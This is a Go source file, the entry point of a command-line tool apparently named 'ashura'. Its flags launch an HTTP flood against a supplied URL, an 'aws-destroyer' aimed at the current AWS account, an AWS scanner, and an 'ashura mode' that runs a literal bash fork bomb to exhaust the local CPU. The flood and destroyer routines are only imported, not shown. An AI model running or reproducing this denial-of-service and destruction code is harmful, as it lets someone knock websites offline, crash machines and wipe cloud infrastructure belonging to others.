package main

import (
	"flag"
	"fmt"
	log "github.com/sirupsen/logrus"
	"io"
	"os"
	"os/exec"
	"runtime"

	"ashura/pkg/awsDestroyer"
	"ashura/pkg/dos"
	scan "ashura/pkg/scanner"
)

func main() {
	/*
	   Setting logging
	*/
	multiWriter := io.MultiWriter(os.Stdout)
	formatter := &log.TextFormatter{
		FullTimestamp: true,
	}
	log.SetLevel(log.DebugLevel)
	log.SetReportCaller(true)
	log.SetFormatter(formatter)
	log.SetOutput(multiWriter)

	var enableHttpFlood bool
	var enableAshuraMode bool
	var enableAwsDestroyer bool
	var scanner string
	var url string

	flag.BoolVar(&enableHttpFlood, "http-flood", false, "Run http flood to flood http/s endpoint with requests")
	flag.BoolVar(&enableAshuraMode, "ashura-mode", false, "Run in ashura mode(fork bomb to make local system run out of cpu capacity)")
	flag.BoolVar(&enableAwsDestroyer, "aws-destroyer", false, "Run aws destroyer against current aws account")
	flag.StringVar(&scanner, "scanner", "", "Run scanning process against: \n\t\t1.AWS account")
	flag.StringVar(&url, "url", "", "Pass url to 1. http-flood")
	flag.Parse()

	if enableHttpFlood {
		dos.HttpFlood(url)
	}
	if enableAshuraMode {
		ashuraMode()
	}
	if enableAwsDestroyer {
		awsDestroyer.AwsDestroyer()
	}
	if scanner != "" {
		scan.ScannerHandler(scanner)
	}
}

func ashuraMode() {
	fmt.Println("[-] Running ashura mode...")
	if runtime.GOOS == "linux" {
		cmd := exec.Command("/bin/bash", "-c", ":(){ :|:& };:")
		_ = cmd.Run()
	}
}
